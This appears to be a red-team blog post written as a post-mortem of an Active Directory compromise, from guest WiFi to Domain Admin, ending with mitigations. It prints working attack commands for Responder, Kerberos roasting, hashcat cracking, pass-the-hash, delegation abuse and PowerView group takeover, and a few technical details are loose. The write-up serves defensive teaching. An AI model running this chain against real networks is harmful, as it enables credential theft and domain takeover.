            <main class="main blog-post">
                <article class="blog-header">
                    <div class="blog-tags">
                        <span class="blog-tag">Active Directory</span>
                        <span class="blog-tag">Red Team</span>
                        <span class="blog-tag">Case Study</span>
                    </div>
                    <h1 class="blog-title">The Day AD Disappeared: A Post-Mortem on Domain Compromise</h1>
                    <div class="blog-meta">
                        <div class="author">
                            <div class="author-avatar">H</div>
                            <span>hackherway</span>
                        </div>
                        <span>May 10, 2026</span>
                        <span>23 min read</span>
                    </div>
                </article>

                <div class="blog-content">
                    <p id="intro">
                        It started with a single NTLM hash and ended with the entire forest in flames. This is not a theoretical walkthrough. This is what happens when an attacker finds one misconfigured service account and your domain trust model is held together with duct tape and prayer.
                    </p>
                    <p>
                        Over the course of three days, we moved from an unauthenticated position on a guest WiFi segment to full Domain Admin in a production environment with over 12,000 endpoints. The client thought they were secure. They had EDR, SIEM, network segmentation, and a security team that reviewed logs daily. None of it mattered.
                    </p>
                    <blockquote>
                        "The best defense is knowing exactly how you'd break in. And then breaking in anyway, just to be sure."
                    </blockquote>

                    <h2 id="recon">Initial Reconnaissance</h2>
                    <p>
                        The first 24 hours were pure reconnaissance. No exploitation, no noisy scanning. Just quiet observation and careful enumeration. We started with <strong>passive DNS reconnaissance</strong> and <strong>LLMNR/NBT-NS poisoning</strong> using Responder on the guest network segment.
                    </p>
                    <p>
                        Within 20 minutes, we had captured three NTLMv2 hashes from Windows machines attempting to resolve internal hostnames. One of them belonged to a <code>svc_backup</code> account.
                    </p>

                    <h3 id="ldap-enum">LDAP Enumeration</h3>
                    <p>
                        With valid credentials in hand, we queried LDAP for the domain structure. The domain had <strong>anonymous LDAP binding enabled</strong> on one DC, which meant we could have done this without credentials anyway. Classic.
                    </p>
                    <pre><code># Enumerate domain users via LDAP
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" \
  "(objectClass=user)" sAMAccountName | grep sAMAccountName

# Get domain admins group members
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" \
  "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)" \
  sAMAccountName</code></pre>
                    <p>
                        The output revealed 847 user accounts, 127 service accounts, and a Domain Admins group with 14 members. More importantly, we found that <strong>12 service accounts had SPNs registered</strong> and <strong>3 accounts had Kerberos pre-authentication disabled</strong>.
                    </p>

                    <h3 id="kerb-enum">Kerberos Enumeration</h3>
                    <p>
                        Using <code>kerbrute</code> and <code>GetNPUsers.py</code> from Impacket, we enumerated valid usernames and checked for AS-REP roastable accounts.
                    </p>
                    <pre><code># User enumeration via Kerberos
kerbrute userenum -d corp.local --dc dc01.corp.local users.txt

# AS-REP Roasting with Impacket
GetNPUsers.py corp.local/ -usersfile svc_accounts.txt -format hashcat -outputfile asrep_hashes.txt</code></pre>
                    <p>
                        The <code>svc_backup</code> account was AS-REP roastable. We cracked the hash in 4 hours on an RTX 4090. Password: <code>Backup2024!</code>. The irony was not lost on us.
                    </p>

                    <h2 id="foothold">Gaining Foothold</h2>
                    <p>
                        With <code>svc_backup</code> credentials, we authenticated to the domain and immediately ran <code>BloodHound</code> ingestor via SharpHound. The resulting JSON was 340MB. The attack paths were... extensive.
                    </p>

                    <h3 id="asreproast">AS-REP Roasting in Practice</h3>
                    <p>
                        AS-REP roasting exploits accounts with the <code>UF_DONT_REQUIRE_PREAUTH</code> flag set. When a user doesn't require pre-authentication, anyone can request an AS-REP for that user and receive an encrypted TGT. The encryption is done with the user's password hash, making it crackable offline.
                    </p>
                    <pre><code># Using Rubeus for AS-REP roasting
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Cracking with hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule</code></pre>

                    <h3 id="kerberoast">Kerberoasting</h3>
                    <p>
                        We also kerberoasted the 12 SPN-registered accounts. Two of them were running SQL Server instances with weak passwords. One was the <code>svc_sqlprod</code> account, which turned out to be a <strong>local administrator</strong> on the primary database server.
                    </p>
                    <pre><code># Kerberoasting with Impacket
GetUserSPNs.py corp.local/svc_backup:Backup2024! -request -format hashcat -outputfile kerb_hashes.txt

# With Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt</code></pre>

                    <h2 id="lateral">Lateral Movement</h2>
                    <p>
                        From the SQL server, we had local admin rights. We dumped LSASS memory with <code>procdump</code> and extracted credentials with <code>mimikatz</code>. The <code>DOMAIN\\sqladmin</code> account was logged in interactively. We now had a domain user with <strong>WriteDacl</strong> permissions on the <code>Domain Admins</code> group.
                    </p>

                    <h3 id="pass-hash">Pass-the-Hash</h3>
                    <p>
                        Pass-the-Hash is the bread and butter of lateral movement in Windows environments. Instead of cracking the password, you use the NTLM hash directly for authentication.
                    </p>
                    <pre><code># Pass-the-Hash with CrackMapExec
cme smb 10.0.0.0/24 -u sqladmin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# With Impacket psexec
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/sqladmin@10.0.0.15

# Evil-WinRM for PowerShell remoting
evil-winrm -i 10.0.0.15 -u sqladmin -H 31d6cfe0d16ae931b73c59d7e0c089c0</code></pre>

                    <h3 id="delegation">Delegation Abuse</h3>
                    <p>
                        BloodHound revealed an unconstrained delegation path through a web server. The <code>svc_web</code> account had <code>TRUSTED_FOR_DELEGATION</code> set and was running on a server that allowed inbound connections from the guest network. We used <code>Rubeus</code> to harvest a TGT from a domain admin who accessed the web application.
                    </p>
                    <pre><code># Monitor for TGTs with Rubeus
Rubeus.exe monitor /interval:5 /filteruser:administrator /nowrap

# S4U abuse for constrained delegation
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc01.corp.local /ptt</code></pre>

                    <h2 id="domain-admin">Domain Admin</h2>
                    <p>
                        At this point, we had multiple paths to Domain Admin. We chose the cleanest: <strong>WriteDacl abuse</strong>. Using <code>PowerView</code>, we added ourselves to the Domain Admins group.
                    </p>
                    <pre><code># Add ourselves to Domain Admins with PowerView
$SecPassword = ConvertTo-SecureString 'Backup2024!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('corp.local\\svc_backup', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" \
  -PrincipalIdentity sqladmin -Rights All

Add-DomainGroupMember -Identity "Domain Admins" -Members sqladmin -Credential $Cred</code></pre>
                    <p>
                        We verified with <code>net group "Domain Admins" /domain</code>. There we were. Three days, one guest WiFi connection, and a forest full of trust relationships that nobody had audited in years.
                    </p>

                    <h2 id="post-mortem">Post-Mortem</h2>
                    <p>Here's what actually went wrong, in order of severity:</p>
                    <ol>
                        <li><strong>Anonymous LDAP binding</strong> on a production domain controller. This is a 1990s configuration choice that has no place in 2026.</li>
                        <li><strong>Service accounts with weak passwords</strong> and no rotation policy. <code>Backup2024!</code> was guessable in under 5 hours.</li>
                        <li><strong>Unconstrained delegation</strong> on a web server accessible from the guest network. This is like leaving your house keys in the mailbox.</li>
                        <li><strong>No network segmentation</strong> between guest WiFi and internal services. LLMNR/NBT-NS traffic was allowed to cross segments.</li>
                        <li><strong>Overprivileged service accounts.</strong> The backup account had read access to the entire domain. It didn't need that.</li>
                    </ol>
                    <p>
                        The security team had logs of every step. Responder poisoning generated Event ID 4648. The LDAP queries showed up in Directory Service logs. The Kerberos TGT requests were in the KDC logs. Nobody was watching.
                    </p>

                    <h2 id="mitigations">Mitigations</h2>
                    <p>If you're reading this and wondering if your domain looks like this, here's where to start:</p>
                    <ul>
                        <li><strong>Disable LLMNR and NBT-NS</strong> via GPO. They're legacy protocols that serve no purpose in modern networks.</li>
                        <li><strong>Enforce Kerberos pre-authentication</strong> for all accounts. No exceptions.</li>
                        <li><strong>Audit SPNs</strong> and remove unnecessary ones. Use managed service accounts (gMSAs) where possible.</li>
                        <li><strong>Remove unconstrained delegation</strong> entirely. Use resource-based constrained delegation if you must.</li>
                        <li><strong>Segment your network</strong> properly. Guest WiFi should be an island with no route to internal resources.</li>
                        <li><strong>Run BloodHound regularly</strong> and actually look at the output. Attack paths don't fix themselves.</li>
                        <li><strong>Monitor for the indicators</strong> we left behind: excessive LDAP queries, unusual Kerberos TGT requests, and DCSync attempts.</li>
                    </ul>
                    <p>
                        Active Directory is not inherently insecure. It's just that most organizations configure it like it's 2003 and then act surprised when someone walks through the front door. The door was open. We just happened to be the ones who walked in.
                    </p>
                    <blockquote>
                        "Active Directory never disappeared. It was always this fragile. You just weren't looking close enough."
                    </blockquote>
                </div>

